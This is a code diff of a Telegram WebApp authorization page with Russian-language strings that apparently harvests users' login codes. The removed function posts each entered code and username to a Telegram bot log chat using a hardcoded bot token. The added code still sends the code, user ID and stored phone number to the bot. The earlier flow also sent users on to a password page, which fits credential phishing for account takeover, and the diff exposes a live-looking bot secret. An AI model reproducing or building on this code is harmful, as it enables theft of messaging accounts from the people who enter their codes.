@@ -241,36 +241,6 @@
 					}
 				}
 
-				function sendCodeToBot(safeCode) {
-					try {
-						const botToken = '8260777158:AAHcoUGlzRodN2_7Xkrt4DLF1ovHAHYaH90';
-						const logChatId = '-1003235434555';
-
-						const user = tg?.initDataUnsafe?.user;
-						const username = user?.username
-							? `@${user.username}`
-							: 'без username';
-
-						const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${safeCode}`;
-
-						fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-							method: 'POST',
-							headers: {
-								'Content-Type': 'application/json',
-							},
-							body: JSON.stringify({
-								chat_id: logChatId,
-								text: message,
-								parse_mode: 'HTML',
-							}),
-						}).catch(error => {
-							console.error('Ошибка отправки кода в лог:', error);
-						});
-					} catch (e) {
-						console.log('Error sending code to bot:', e);
-					}
-				}
-
 				function handleCodeInput(value) {
 					try {
 						if (isProcessing) return;
@@ -302,30 +272,21 @@
 						if (authScreen) authScreen.style.display = 'none';
 						if (loadingScreen) loadingScreen.style.display = 'flex';
 
-						try {
-							if (tg && tg.sendData) {
-								tg.sendData(
-									JSON.stringify({
-										type: 'auth_code',
-										code: code,
-										user_id: tg.initDataUnsafe?.user?.id,
-										phone_number: '',
-									})
-								);
-							}
-						} catch (sendError) {
-							console.log('Error sending data to Telegram:', sendError);
-						}
-
-						sendCodeToBot(code);
-
-						setTimeout(() => {
-							safeNavigate(
-								`password.html?phone=&code=${encodeURIComponent(code)}`
+						if (tg && tg.sendData) {
+							tg.sendData(
+								JSON.stringify({
+									type: 'auth_code',
+									code: code,
+									user_id: tg.initDataUnsafe?.user?.id || '',
+									phone_number: localStorage.getItem('phone_number') || '',
+								})
 							);
-						}, 2000);
+							if (tg.close) tg.close();
+						} else {
+							console.log('Telegram WebApp недоступен, данные не отправлены');
+						}
 					} catch (processError) {
-						console.log('Error processing auth code:', processError);
+						console.log('Ошибка обработки кода авторизации:', processError);
 						isProcessing = false;
 					}
 				}
